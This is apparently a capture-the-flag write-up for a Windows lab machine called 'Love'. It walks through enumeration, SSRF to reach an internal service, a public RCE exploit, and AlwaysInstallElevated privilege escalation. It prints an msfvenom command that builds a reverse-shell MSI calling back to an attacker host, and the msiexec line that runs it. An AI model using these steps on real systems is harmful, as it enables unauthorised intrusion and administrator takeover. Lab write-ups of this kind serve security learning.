# Love

## Gaining Access

Nmap scan:

![](../../../.gitbook/assets/love-1.png)

Lots of ports open.

### TLS Cert Checking

Port 80 reveals a voting system that requries credentials. Port 5000 was blocked off for whatever reason.

![](../../../.gitbook/assets/love-3.png)

A bit of enumeration on the type of service running reveals that it was an outdated software with loads of vulnerabilities:

![](../../../.gitbook/assets/love-9.png)

Checking the certificate on port 443 reveals a hidden sub-domain.

![](../../../.gitbook/assets/love-2.png)

We can add this to the `/etc/hosts` file and view it.

### SSRF -> Authenticated RCE

The sub-domain found reveals this:

![](../../../.gitbook/assets/love-5.png)

Signing up and viewing it would direct us to this page:

![](../../../.gitbook/assets/love-11.png)

I was able to get hits on a HTTP server hosted on my machine, but I could not download or execute anything. Since it was the server sending requests, I tried to enter `http://localhost:5000` and was returned this:

![](../../../.gitbook/assets/love-10.png)

With credentials, we now get a shell using an RCE exploit that is publicly available. Just change the settings here:

![](../../../.gitbook/assets/love-7.png)

Then run the exploit:

![](../../../.gitbook/assets/love-6.png)

## Privilege Escalation

### AlwaysInstallElevated

When on the machine, I ran winPEAS to enumerate for me and found that `AlwaysInstallElevated` was set to 1.

![](../../../.gitbook/assets/love-8.png)

What this exploit allows us to do is execute commands as the Administrator user through `msiexec`. As such, we would first need to generate a quick reverse shell using `msfvenom`.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o rev.msi

# on target
msiexec /quiet /qn /i C:\directory\to\rev.msi
```

Afterwards, we would get a shell as the administrator:

![](../../../.gitbook/assets/love-4.png)
